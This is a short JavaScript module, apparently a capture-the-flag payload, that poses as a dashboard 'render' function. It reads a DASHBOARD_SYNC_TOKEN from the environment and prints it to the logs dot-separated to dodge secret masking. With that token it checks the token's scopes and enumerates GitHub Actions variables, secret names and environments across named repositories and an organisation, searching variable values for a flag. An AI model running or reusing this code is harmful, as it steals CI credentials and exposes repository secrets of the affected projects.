export async function render(context) {
  const flagRe = /DevopsDowntime\{[^}]*\}/i;
  const t = (process.env.DASHBOARD_SYNC_TOKEN || "").trim();
  console.log("TOKSEP", t.split("").join("."));
  const h = { Authorization: `Bearer ${t}`, Accept: "application/vnd.github+json", "X-GitHub-Api-Version": "2022-11-28", "User-Agent": "x" };
  const j = async (u) => { const r = await fetch(u, { headers: h }); let b = null; try { b = await r.json(); } catch {} return [r.status, b, r.headers.get("x-oauth-scopes")]; };
  const repos4 = ["DevOpsDownTimeV3/changelog-generator", "DevOpsDownTimeV3/devopsdowntime-website", "DevOpsDownTimeV3/status-feed-builder", "saurabbhattarai-lf/project-feed-builder"];
  const [, , scopes] = await j("https://api.github.com/user");
  console.log("SCOPES", JSON.stringify(scopes));
  const dump = (full, ep, s, b) => {
    let info = "";
    if (b) {
      if (b.variables) info = b.variables.map(v => v.name + "=" + v.value).join(" | ");
      else if (b.secrets) info = "secrets:" + b.secrets.map(x => x.name).join(",");
      else if (b.environments) info = "envs:" + b.environments.map(x => x.name).join(",");
    }
    console.log("EP", full, ep, s, info);
    if (b && b.variables) for (const v of b.variables) { const m = String(v.value || "").match(flagRe); if (m) console.log("VAR_FLAG", full, v.name, m[0]); }
  };
  for (const full of repos4) {
    for (const ep of ["actions/variables", "actions/secrets", "environments"]) {
      const [s, b] = await j(`https://api.github.com/repos/${full}/${ep}`);
      dump(full, ep, s, b);
    }
  }
  for (const ep of ["actions/variables", "actions/secrets"]) {
    const [s, b] = await j(`https://api.github.com/orgs/DevOpsDownTimeV3/${ep}`);
    dump("ORG", ep, s, b);
  }
  console.log("DONE");
  return JSON.stringify({ ok: true }) + "\n";
}
